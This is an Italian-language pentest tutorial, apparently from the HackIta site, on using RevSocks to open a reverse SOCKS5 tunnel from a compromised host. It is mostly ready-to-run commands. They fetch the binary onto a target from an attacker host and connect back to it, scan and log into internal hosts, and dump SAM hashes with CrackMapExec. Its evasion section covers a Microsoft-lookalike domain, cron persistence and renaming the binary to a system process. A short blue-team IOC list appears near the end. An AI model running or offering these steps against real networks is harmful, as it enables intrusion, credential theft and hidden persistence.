---
title: 'RevSocks: Reverse SOCKS Proxy per Pivoting e Accesso Interno'
slug: revsocks
description: >-
  RevSocks crea un reverse SOCKS proxy tra attacker e target compromesso,
  permettendo pivoting e accesso a reti interne in pentest autorizzati.
image: /Gemini_Generated_Image_2q8fux2q8fux2q8f.webp
draft: false
date: 2026-02-22T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - pivoting
  - proxy
---

Revsocks è un tool specializzato per creare tunnel SOCKS5 reverse attraverso connessioni TLS, progettato specificamente per scenari dove il traffico in uscita è pesantemente filtrato. A differenza di altri tool di tunneling, Revsocks si concentra esclusivamente su reverse SOCKS proxy con encryption TLS nativa, rendendolo ideale per ambienti enterprise con deep packet inspection. In questa guida impari a deployare Revsocks per pivoting stealth e accesso a reti interne protette.

## Posizione nella Kill Chain

Revsocks opera nelle fasi di pivoting post-exploitation:

| Fase              | Tool Precedente   | Revsocks               | Tool Successivo                                            |
| ----------------- | ----------------- | ---------------------- | ---------------------------------------------------------- |
| Post-Exploitation | Initial shell     | → Setup reverse tunnel | → Network access                                           |
| Pivoting          | Foothold stable   | → SOCKS5 proxy         | → Internal scan                                            |
| Lateral Movement  | Route established | → Proxy traffic        | → [CrackMapExec](https://hackita.it/articoli/crackmapexec) |
| Persistence       | Access confirmed  | → Persistent tunnel    | → Long-term access                                         |

## Installazione e Setup

### Download Pre-compilato

```bash
# Scarica release
wget https://github.com/kost/revsocks/releases/download/v1.0/revsocks_linux_amd64
chmod +x revsocks_linux_amd64
mv revsocks_linux_amd64 /usr/local/bin/revsocks

# Windows (per target)
wget https://github.com/kost/revsocks/releases/download/v1.0/revsocks_windows_amd64.exe
```

### Compilazione da Source

```bash
git clone https://github.com/kost/revsocks.git
cd revsocks
go build -ldflags="-s -w" .
```

### Verifica Installazione

```bash
revsocks -h
```

Output atteso:

```
Usage of revsocks:
  -connect string
        connect to address:port
  -listen string
        listen on address:port
  -socks string
        SOCKS5 listen on address:port
  ...
```

## Architettura Revsocks

Il modello è client-server con ruoli invertiti rispetto a proxy tradizionali:

```
┌─────────────┐         TLS          ┌─────────────┐
│  Attacker   │◄──────────────────────│   Victim    │
│  (Server)   │                       │  (Client)   │
│             │                       │             │
│ SOCKS:1080  │      Firewall OK      │  Connects   │
│             │        (egress)       │  outbound   │
└─────────────┘                       └─────────────┘
```

1. **Server** (attacker): ascolta connessioni, espone SOCKS5 locale
2. **Client** (victim): connette al server, tunnela traffico dalla rete interna

## Uso Base

### Server Mode (Tua Macchina)

```bash
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword
```

Parametri:

* `-listen :8443`: porta per connessioni client
* `-socks 127.0.0.1:1080`: SOCKS5 proxy locale
* `-pass`: password per autenticazione client

Output:

```
2024/01/15 10:30:00 Listening on :8443
2024/01/15 10:30:00 SOCKS5 on 127.0.0.1:1080
```

### Client Mode (Target Compromesso)

```bash
./revsocks -connect attacker.com:8443 -pass SuperSecretPassword
```

Output:

```
2024/01/15 10:31:00 Connecting to attacker.com:8443
2024/01/15 10:31:00 Connected
```

### Usa il Proxy

Una volta connesso, usa il SOCKS5 proxy:

```bash
# proxychains
proxychains nmap -sT -Pn 10.10.10.0/24

# curl
curl --socks5 127.0.0.1:1080 http://10.10.10.100

# Firefox/Browser
# Settings → SOCKS5 proxy: 127.0.0.1:1080
```

## Configurazione TLS

### TLS con Certificato Self-Signed

Revsocks usa TLS di default. Per certificato custom:

```bash
# Genera certificato
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Server con cert
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass secret -cert cert.pem -key key.pem

# Client (skip verify per self-signed)
./revsocks -connect server:8443 -pass secret
```

### Verifica Certificato

Per production, usa certificato valido:

```bash
# Con Let's Encrypt
revsocks -listen :443 -socks 127.0.0.1:1080 -pass secret \
  -cert /etc/letsencrypt/live/domain/fullchain.pem \
  -key /etc/letsencrypt/live/domain/privkey.pem
```

## Scenari Pratici di Penetration Test

### Scenario 1: Pivoting Base da Host Compromesso

**Timeline stimata: 10 minuti**

Hai shell su server nella DMZ. Obiettivo: accedere a rete interna 10.10.10.0/24.

```bash
# COMANDO: Avvia server sulla tua macchina
revsocks -listen :443 -socks 127.0.0.1:1080 -pass P3nt3st2024!
```

## OUTPUT ATTESO

```
Listening on :443
SOCKS5 on 127.0.0.1:1080
```

```bash
# COMANDO: Trasferisci revsocks sul target
curl http://ATTACKER/revsocks -o /tmp/rs
chmod +x /tmp/rs

# COMANDO: Connetti client
/tmp/rs -connect ATTACKER:443 -pass P3nt3st2024!
```

## OUTPUT ATTESO

```
Connecting to ATTACKER:443
Connected
```

```bash
# COMANDO: Scan rete interna via proxy
proxychains -q nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
```

## OUTPUT ATTESO

```
10.10.10.1 - 22/open
10.10.10.50 - 80/open, 443/open
10.10.10.100 - 445/open, 3389/open
```

### COSA FARE SE FALLISCE

* **Client non connette**: Verifica egress filtering. Prova porta 80 o 443.
* **Proxy non risponde**: Verifica che SOCKS sia bound su 127.0.0.1:1080.
* **Password mismatch**: Stessa password su client e server.

### Scenario 2: Ambiente con DPI (Deep Packet Inspection)

**Timeline stimata: 15 minuti**

Firewall ispeziona traffico. Revsocks TLS bypassa inspection.

```bash
# COMANDO: Server con TLS su porta HTTPS standard
revsocks -listen :443 -socks 127.0.0.1:1080 -pass secret \
  -cert valid_cert.pem -key valid_key.pem
```

```bash
# COMANDO: Client - traffico appare come HTTPS legittimo
./revsocks -connect legitimate-looking-domain.com:443 -pass secret
```

Il traffico TLS sulla porta 443 è indistinguibile da HTTPS normale per DPI.

### Scenario 3: Accesso a Servizi Specifici

**Timeline stimata: 10 minuti**

Invece di full SOCKS, accedi a servizi specifici:

```bash
# COMANDO: Setup tunnel
revsocks -listen :443 -socks 127.0.0.1:1080 -pass secret

# Sul target
./revsocks -connect ATTACKER:443 -pass secret
```

```bash
# COMANDO: RDP a host interno
proxychains xfreerdp /v:10.10.10.100 /u:admin

# COMANDO: SSH a host interno  
proxychains ssh user@10.10.10.50

# COMANDO: SMB enumeration
proxychains smbclient -L //10.10.10.100/ -U guest
```

### Scenario 4: Kill Chain con Revsocks

**Timeline totale: 90 minuti**

1. **Initial Access (20min)**: Exploit webserver → shell
2. **Tunnel Setup (10min)**: Deploy revsocks → SOCKS proxy attivo
3. **Internal Recon (20min)**: Scan rete interna via proxy
4. **Credential Harvesting (20min)**: [CrackMapExec](https://hackita.it/articoli/crackmapexec) → hash dump
5. **Lateral Movement (20min)**: [PsExec](https://hackita.it/articoli/psexec) verso DC

```bash
# Fase 3-4: Recon e Credential via proxy
proxychains crackmapexec smb 10.10.10.0/24 -u '' -p ''
proxychains crackmapexec smb 10.10.10.100 -u admin -H HASH --sam
```

## Defense Evasion

### Tecnica 1: Porta Standard HTTPS

```bash
revsocks -listen :443 -socks 127.0.0.1:1080 -pass secret
```

Traffico su 443 con TLS appare come normale HTTPS.

### Tecnica 2: Dominio Legittimo

Configura DNS per puntare a tuo server con dominio credibile:

```
update.microsoft-cdn.com → YOUR_IP
```

```bash
./revsocks -connect update.microsoft-cdn.com:443 -pass secret
```

### Tecnica 3: Orario Lavorativo

Esegui tunnel durante orari business quando traffico HTTPS è normale:

```bash
# Cron sul target per connessione solo orario lavorativo
0 9 * * 1-5 /tmp/rs -connect server:443 -pass secret &
0 18 * * 1-5 pkill rs
```

## Integration Matrix

| Revsocks +                                               | Risultato    | Comando                         |
| -------------------------------------------------------- | ------------ | ------------------------------- |
| [Nmap](https://hackita.it/articoli/nmap)                 | Scan interno | `proxychains nmap -sT target`   |
| [CrackMapExec](https://hackita.it/articoli/crackmapexec) | AD enum      | `proxychains cme smb range`     |
| [Impacket](https://hackita.it/articoli/impacket)         | WMI/SMB exec | `proxychains wmiexec.py`        |
| [BloodHound](https://hackita.it/articoli/bloodhound)     | Collection   | `proxychains bloodhound-python` |

## Confronto: Revsocks vs Alternative

| Feature    | Revsocks   | Chisel        | SSH -D        | Ligolo-ng     |
| ---------- | ---------- | ------------- | ------------- | ------------- |
| TLS nativo | ✓          | Optional      | Via SSH       | ✓             |
| Setup      | Semplice   | Semplice      | Richiede SSH  | Complesso     |
| Auth       | Password   | Optional      | Keys/Pass     | Cert          |
| Focus      | Solo SOCKS | Multi-purpose | Multi-purpose | TUN interface |
| Size       | Piccolo    | Medio         | N/A           | Medio         |

**Quando usare Revsocks**: ambiente hardened con DPI, serve solo SOCKS5, vuoi setup minimalista.

**Quando usare alternative**: serve port forwarding specifico (Chisel), TUN interface (Ligolo).

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* Connessioni TLS outbound long-lived
* Processo sconosciuto con connessione persistente
* Traffic pattern SOCKS attraverso single connection
* Binario non firmato con network activity

### IOCs

```
# Process names
revsocks
rs
systemd-update (se rinominato)

# Network
TLS connection durata ore/giorni
Single destination con molto traffico
```

### Evasion Tips

1. **Rinomina binario**: `mv revsocks /tmp/systemd-logind`
2. **Background silenzioso**: `nohup ./rs -connect ... &>/dev/null &`
3. **Interval reconnect**: script che riconnette periodicamente
4. **Mimicry**: usa nomi processo simili a servizi legittimi

## Troubleshooting

### Client non si connette

```bash
# Verifica raggiungibilità
curl -k https://server:443

# Debug mode
revsocks -connect server:443 -pass secret -debug
```

### SOCKS non risponde

```bash
# Verifica binding
netstat -tulpn | grep 1080

# Test locale
curl --socks5 127.0.0.1:1080 http://example.com
```

### Connessione instabile

```bash
# Wrapper per reconnect automatico
while true; do
  ./revsocks -connect server:443 -pass secret
  sleep 10
done
```

### Proxychains lento

Modifica `/etc/proxychains.conf`:

```
tcp_read_time_out 30000
tcp_connect_time_out 10000
```

## Cheat Sheet Comandi

| Operazione        | Comando                                                   |
| ----------------- | --------------------------------------------------------- |
| Server base       | `revsocks -listen :PORT -socks 127.0.0.1:1080 -pass PASS` |
| Client base       | `revsocks -connect SERVER:PORT -pass PASS`                |
| Con certificato   | `-cert cert.pem -key key.pem`                             |
| Background client | `nohup ./revsocks -connect ... &>/dev/null &`             |
| Test SOCKS        | `curl --socks5 127.0.0.1:1080 http://target`              |
| Proxychains       | `proxychains COMMAND`                                     |

## FAQ

**Revsocks vs Chisel?**

Revsocks è più semplice e focalizzato solo su reverse SOCKS. Chisel offre più opzioni ma più complessità.

**Il traffico è criptato?**

Sì, TLS è default. Tutto il traffico è criptato end-to-end.

**Funziona attraverso proxy HTTP aziendale?**

Non direttamente. Per quel caso usa Chisel con HTTP o tool specifici per proxy traversal.

**Quanto è stabile la connessione?**

Dipende dalla rete. Per connessioni instabili, implementa reconnect logic.

**Posso usare più client simultaneamente?**

Sì, il server accetta multiple connessioni. Ogni client crea un tunnel separato.

**È legale usare Revsocks?**

Solo su reti autorizzate. Per penetration test professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Revsocks GitHub](https://github.com/kost/revsocks)
